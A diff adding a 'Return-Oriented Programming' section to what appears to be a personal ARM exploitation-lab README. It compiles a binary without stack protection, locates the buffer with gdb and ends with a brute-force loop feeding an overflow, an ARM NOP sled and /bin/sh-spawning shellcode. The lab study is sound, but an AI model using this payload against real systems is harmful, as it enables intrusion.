@@ -173,3 +173,48 @@ pi@korkeep:~/RTL $ gdb -q RTL
 ![image](https://user-images.githubusercontent.com/20378368/107734200-3174ba00-6d40-11eb-8306-32b063492b3f.png)  
 
 ## Return-Oriented Programming 🐱‍💻
+### Binary analysis
+- **Step 1**: Set ASLR  
+```
+pi@korkeep:~/ROP $ sudo sysctl -w kernel.randomize_va_space=1
+```
+- **Step 2**: Compile without stack protection  
+```
+pi@korkeep:~/ROP $ gcc -fno-stack-protector -o ROP ROP.c
+```
+- **Step 3**: Debugging with gdb  
+```
+pi@korkeep:~/ROP $ gdb -q ROP
+(gdb) start
+```
+- **Step 4**: Disassemble main  
+```
+(gdb) disassemble main
+```
+![image](https://user-images.githubusercontent.com/20378368/107897458-6ff6b880-6f7c-11eb-9472-6f2ca16d9090.png)  
+- **Step 5**: Disassemble vulnerable function  
+```
+(gdb) disassemble rop
+```
+![image](https://user-images.githubusercontent.com/20378368/107897522-9a487600-6f7c-11eb-86d1-ef7a807dc736.PNG)  
+- **Step 6**: Check sp address  
+```
+(gdb) x/32x $sp
+```
+![image](https://user-images.githubusercontent.com/20378368/107897690-1478fa80-6f7d-11eb-9397-15a4355bbefd.png)  
+- **Step 7**: Memory state  
+![image](https://user-images.githubusercontent.com/20378368/107897595-d8de3080-6f7c-11eb-9a9d-af40b59e1b36.PNG)  
+- **Step 8**: Calculate return address  
+```
++ lr,r11 (main): 0x7efff640
++ argc,argv: 0x7efff638
++ lr,r11 (rop): 0x7efff630
++ buf[256]: 0x7efff530
+∴ Target address: 0x7efff530
+```
+- **Step 9**: Brute force ROP attack  
+```
+pi@korkeep:~/ROP $ while true; do ./ROP $(python -c 'print "A"*260+"\x30\xf5\xff\x7e"+"\x01\x10\xa0\xe1"*100+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'); done
+```
+- **Result**  
+![image](https://user-images.githubusercontent.com/20378368/107898049-13949880-6f7e-11eb-83d1-7179e4d88f7a.PNG)  
